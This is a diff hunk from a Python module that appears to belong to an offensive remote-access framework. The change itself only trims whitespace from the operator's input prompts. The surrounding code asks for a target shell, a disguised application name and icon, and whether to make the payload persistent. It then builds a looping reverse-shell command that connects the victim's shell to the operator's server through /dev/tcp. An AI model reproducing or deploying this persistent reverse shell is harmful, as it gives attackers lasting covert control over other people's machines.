@@ -29,10 +29,10 @@ class payload:
 
 	def run(self,server):
 		while 1:
-			shell = raw_input(h.info_general_raw("Target Shell: "))
-                        name = raw_input(h.info_general_raw("Application Name: "))
-                        icon = raw_input(h.info_general_raw("Application Icon: "))
-			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).lower()
+			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
+                        name = raw_input(h.info_general_raw("Application Name: ")).strip(" ")
+                        icon = raw_input(h.info_general_raw("Application Icon: ")).strip(" ")
+			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
 				break
